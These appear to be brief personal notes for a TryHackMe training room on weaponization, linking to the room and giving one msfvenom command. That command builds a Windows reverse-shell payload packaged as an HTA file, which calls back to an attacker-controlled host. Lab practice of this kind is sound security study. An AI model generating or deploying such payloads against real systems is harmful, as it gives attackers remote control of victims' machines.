# Weaponization

**Walkthrough:** [https://tryhackme.com/room/weaponization](https://tryhackme.com/room/weaponization)



## Practice Area

### HTA

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f hta-psh -o thm.hta
```
